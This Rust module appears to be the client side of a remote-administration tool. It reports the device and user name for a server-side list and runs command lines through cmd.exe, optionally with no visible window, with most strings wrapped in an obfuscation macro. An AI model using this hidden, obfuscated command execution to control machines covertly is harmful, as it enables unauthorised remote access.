//! Windows 用户/设备展示名和受限命令行执行工具。
//!
//! Exec 同时读取 stdout/stderr 并持续排空，分别限制保留大小；任务被取消时 `kill_on_drop` 终止子进程，
//! 防止输出过多或超时命令遗留后台进程。

use common::hidden;
use encoding_rs::GBK;
use std::process::Stdio;
use tokio::io::{AsyncRead, AsyncReadExt};
use tokio::process::Command;

const MAX_EXEC_OUTPUT_BYTES: usize = 1024 * 1024;

/// 生成用于服务端列表展示的设备和用户名称；它不是认证身份。
pub fn whoami() -> String {
    hidden!(
        whoami::devicename(),
        "\\",
        whoami::fallible::hostname().unwrap_or_else(|_| hidden!("unknown-host")),
        "\\",
        whoami::username()
    )
}

/// 通过 `cmd.exe /C` 执行命令，并按指定编码合并受限的 stdout/stderr。
pub async fn cmd_exec_line(cmd_line: &str, open_window: bool, gbk: bool) -> anyhow::Result<String> {
    if cmd_line.trim().is_empty() {
        return Err(anyhow::Error::msg(hidden!("命令不能为空")));
    }
    let mut cmd = Command::new(hidden!("cmd.exe"));

    let command = if open_window {
        &mut cmd
    } else {
        cmd.creation_flags(0x08000000)
    };

    command.arg(hidden!("/C")).arg(cmd_line);

    collect_output(command, gbk).await
}

async fn collect_output(command: &mut Command, gbk: bool) -> anyhow::Result<String> {
    let mut child = command
        // 超时取消上层 future 时必须终止子进程，不能留下失控的 cmd.exe。
        .kill_on_drop(true)
        .stderr(Stdio::piped())
        .stdout(Stdio::piped())
        .spawn()?;
    let stdout = child
        .stdout
        .take()
        .ok_or_else(|| anyhow::Error::msg(hidden!("无法读取 stdout")))?;
    let stderr = child
        .stderr
        .take()
        .ok_or_else(|| anyhow::Error::msg(hidden!("无法读取 stderr")))?;
    let (status, stdout, stderr) = tokio::try_join!(
        child.wait(),
        read_stream_capped(stdout),
        read_stream_capped(stderr)
    )?;
    let (stdout, stdout_truncated) = stdout;
    let (stderr, stderr_truncated) = stderr;
    let mut result = hidden!(try_decode(&stdout, gbk), try_decode(&stderr, gbk));
    if stdout_truncated || stderr_truncated {
        result.push_str(&hidden!("\n[输出已截断，stdout/stderr 各最多保留 1 MiB]"));
    }
    if !status.success() {
        let exit_code = status
            .code()
            .map(|code| code.to_string())
            .unwrap_or_else(|| hidden!("被信号终止"));
        result.push_str(&hidden!("\n[进程退出码: ", exit_code, "]"));
    }
    Ok(result)
}

async fn read_stream_capped<R: AsyncRead + Unpin>(
    mut reader: R,
) -> std::io::Result<(Vec<u8>, bool)> {
    let mut output = Vec::with_capacity(16 * 1024);
    let mut buffer = [0_u8; 8192];
    let mut truncated = false;
    loop {
        let read = reader.read(&mut buffer).await?;
        if read == 0 {
            break;
        }
        let remaining = MAX_EXEC_OUTPUT_BYTES.saturating_sub(output.len());
        let keep = remaining.min(read);
        output.extend_from_slice(&buffer[..keep]);
        truncated |= keep < read;
        // 即使达到上限也继续排空管道，否则子进程可能阻塞在写 stdout/stderr。
    }
    Ok((output, truncated))
}

fn try_decode(bys: &[u8], gbk: bool) -> String {
    if gbk {
        //                  enc:实际使用编码格式,error:是否存在因格式错误而被替换的序列
        let (res, _encoding, err) = GBK.decode(bys);
        if err {
            hidden!("GBK解码失败！utf-8: ", String::from_utf8_lossy(bys))
        } else {
            res.to_string()
        }
    } else {
        match String::from_utf8(bys.to_vec()) {
            Ok(s) => s,
            Err(_) => hidden!("Utf-8解码失败！gbk: ", GBK.decode(bys).0),
        }
    }
}

#[tokio::test]
pub async fn test() {
    println!(
        "line输出:||{}||",
        cmd_exec_line(" echo   %USERPROFILE%", false, true)
            .await
            .unwrap()
    );
    let v = "高手高手".as_bytes();

    let (x, y, z) = GBK.decode(v);
    println!("{}", x);
    println!("{:?}", y);
    println!("{}", z);
    // println!("{}", cmd_exec(vec!["ipconfig".to_string()],false).unwrap());
}
